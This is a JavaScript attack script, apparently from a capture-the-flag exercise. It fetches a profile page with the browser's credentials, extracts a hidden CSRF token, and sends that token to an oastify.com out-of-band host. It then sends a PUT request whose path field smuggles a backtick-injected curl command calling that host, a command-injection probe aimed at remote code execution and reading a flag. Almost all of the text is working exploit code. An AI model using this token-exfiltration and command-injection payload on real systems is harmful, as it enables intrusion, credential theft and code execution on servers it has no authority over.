async function fetchPage(url, headers = {}) {
  const response = await fetch(url, {
    method: 'GET',
    headers: headers,
    credentials: 'include'
  });
  return response.text();
}

// Parse HTML and extract single value
function extractValue(html, selector) {
  const doc = new DOMParser().parseFromString(html, 'text/html');
  const element = doc.querySelector(selector);
  return element ? (element.value || element.textContent || element.getAttribute('value')) : null;
}


async function sendForm(url, method = 'POST', data = {}, headers = {}) {
  const options = {
    method: method.toUpperCase(),
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      ...headers
    },
    credentials: 'include'
  };

  const encoded = new URLSearchParams(data).toString();

  if (!['GET', 'HEAD'].includes(options.method)) {
    options.body = encoded;
  } else {
    if (encoded) url += (url.includes('?') ? '&' : '?') + encoded;
  }

  const res = await fetch(url, options);
  return res.json().catch(() => res.text());
}


// GET Request with Query Parameters
async function getRequest(url, params = {}, headers = {}) {
  const queryString = new URLSearchParams(params).toString();
  const fullUrl = queryString ? `${url}?${queryString}` : url;
  
  const response = await fetch(fullUrl, {
    method: 'GET',
    headers: headers,
    credentials: 'include'
  });
  return response.json();
}


// Step 1: fetch html contains token
const html = await fetchPage('http://3.253.11.234/profile');
// Step 2: Extract token (use simpler selector if possible)
const selector = 'body > div > main > div.py-12 > div > div:nth-child(1) > div > section > form.mt-6.space-y-6 > input[type=hidden]:nth-child(1)'; // Simplified
const token = extractValue(html, selector);
const test = await getRequest('http://qvp6rtbbgiykgu9twx19ac1hy84zs4gt.oastify.com', { Token: token  });
// Step 3: Send PUT Request with token &RCE Payload to Read flag 
const logs_endpoint = 'http://3.253.11.234/dashboard/logs/edit';
let logins_path = 'fake.txt` curl http://qvp6rtbbgiykgu9twx19ac1hy84zs4gt.oastify.com?rce=ok ';
sendForm(logs_endpoint,'PUT',logins_path)
